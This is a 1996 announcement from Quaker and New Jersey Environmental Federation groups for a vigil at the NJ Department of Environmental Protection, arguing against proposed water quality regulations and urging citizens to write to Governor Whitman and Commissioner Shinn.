VIGIL FOR CLEANER WATER March 26, l996 from 12 noon to 1 PM at the NJ
Department of Environmental Protection 401 E. State St in Trenton to witness
to our opposition to proposed water quality regulations sponsored by the
Environmental Working Group of the Religious Society of Friends (Quakers)
and the New Jersey Environmental Federation
 
Overview of concern:
As New Jersey citizens, we expect our government to insure that public
drinking water is safe, that private parties will not be allowed to destroy
the biological health of our watersheds, that the laws and regulationsestablished to protect our land and water are effective and fair, and that
our public officials and agencies are trustworthy.<br><br>
In fact, there are many documented incidents of contamination in public
water supplies.  And according to the state's own reports, it is unsafe to
swim in or eat fish from over 90% of New Jersey's water bodies.  People know
in their hearts and minds that the character and scale of our economic
activities are degrading our environment, adversely affecting public health,
and jeopardizing our children's and grandchildren's future.<br><br>
The proposed changes in water quality regulations undermine the ability of
the Department of Environmental Protection (DEP) to address these problems,
and most especially to be regarded as a trustworthy guardian of the public
welfare.  What DEP has presented for public comment is a proposal of
unprecendented length involving four separate sets of regulations.  It is
impossible for those of us who are not experts to address all the specific
details of these proposals.  But it is important that we recognize and
oppose their underlying intent and impacts.<br><br>
New Jersey is already the most densely populated state in the nation, and one of the most affluent and industrialized.  We are home to more toxic
chemicals per square mile than any other state.  Our population is expected
to grow for the foreseeable future, and government policy seeks to increase
our economic activity as well.<br><br>
In these circumstances, it makes no sense to think that efforts to monitor
and control the impact we are having on our environment must not also
increase.  Nor does it make sense to think that environmental protection
will not require more money and more personnel.
However, the current administration has already reduced budget and staff at
DEP, and has proposed additional cuts, totaling a 32% reduction in
expenditures for environmental protection.<br><br>
The proposed regulations would further reduce DEP's ability to monitor,
protect and improve water quality.  Furthermore, industrial and waste
treatment facilities that discharge liquid waste (effluent) into our waters
should bear the costs of assuring that this is done without harming people
or the environment.  Yet these regulations would shift the costs of
protecting our water away from the dischargers and onto taxpayers instead.<br><br>    Background:<br><br><h4>
<b>In 1972, the Federal Clean Water Act required states to establish a permit
system for controlling water pollution.</b><br>
Under its provisions states must require effluent dischargers to use "best available technology" to minimize water quality degradation.  If this technology fails to attain required
water quality standards, states are then required to impose stricter
effluent limits that will protect water quality.<br><br><b>In 1977, the New Jersey legislature enacted the Water Pollution Control Act
and the Water Quality Planning Management Act to restore and maintain water
quality and to protect drinking water.</b><br> <h4>These laws include
"anti-degradation" provisions to prevent new or increased affluent
discharges from further reducing water quality.  In 1991, the legislature
enacted a Clean Water Enforcement Act which includes mandatory penalties for
effluent dischargers who violate the discharge limits of the permits.<br><br>
A first step in implementing the water quality standards of federal law, the
anti-degradation provisions of state law, and watershed planning is to
conduct analytic studies to determine a water body's Total Maximum Dailyanti-degradation provisions of state law, and watershed planning is to
conduct analytic studies to determine a water body's Total Maximum Daily
Load (TMDL) for all relevant pollutants.<br><br>
  Although the Clean Water Act
required states to complete TMDLs for all their water bodies by 1979, and
although the New Jersey Supreme Court issued a ruling in 1990 requiring DEP
to implement the anti-degradation provisions of state law, New Jersey has
yet to adopt a TMDL for any water body in the state.  This provides an
indication of how much must be done before DEP will be able to implement
water quality based permitting and watershed planning, and how severely cuts
in DEP's budget and staff will jeopardize the process of doing do.<br><br>
<b>Problems with the Proposed Regulations:</b>
There are a great many ways in which the proposed regulations would make
polluting New Jersey's water bodies easier and less expensive.  The most
basic ones are:
<b>1)  The regulations contain no requirements, provide no timetable, and
identify no funding sources to implement watershed planning.</b>  So while there
is implied support for a watershed based approach, there is no assurance
that a water quality based permitting process or anti-degradation measures
will ever be adopted or enforced.<br><br>
<b>2)  The regulations provide for "interim permitting" of effluent discharges
based on past discharge levels whether or not the past levels were legally
permissible, and without regard to water quality degradation.</b><br>  This is like
allowing people to drive at whatever speed they choose without penalty
regardless of the legal speed limit or concerns for public safety, so long
as drivers can prove that they drove at that speed at some time in the past
without getting caught.<br><br>
<b>3)   The regulations would both change the methods of measuring water
pollution levels so that pollutants can be substantially diluted before they
are measured, and alter the calculations on which issuing permits is
justified.<b><br>  The effect of the changes would significantly increase the
quantity of pollutants that can be legally discharged into the state's water
bodies.<br><br>
<b>4)   The regulations would no longer require permit applicants to pay the
full cost of technical studies needed to issue permits that comply with the
law.</b><br> Furthermore, increased pollution by waste dischargers will inevitably
increase the cost of drinking and domestic water treatment for all of us.The adoption of these regulations would further degrade New Jersey's water
bodies, constitute a clear and present danger to public health, shift costs
from dischargers to taxpayers, and violate federal law.  There are
substantial reasons to question the trustworthiness of the process by which
they are being proposed.<br><br>
<b>Recommendation:</b><br>
We ask Governor Whitman and Commissioner Shinn to use the scheduled period
of public comment on the proposed water quality regulations as a first step
in replacing the current proposal with one that protects the health and well
being of New Jersey citizens, that protects the environment on which our
future depends, and that complies with the law.  The process by which new
regulations are written and adopted should be open to broad participation
and scrutiny.<br><br>
We urge New Jersey citizens to write Governor Whitman, Commissioner Shinn,
and your legislators to support this request.<br><br>
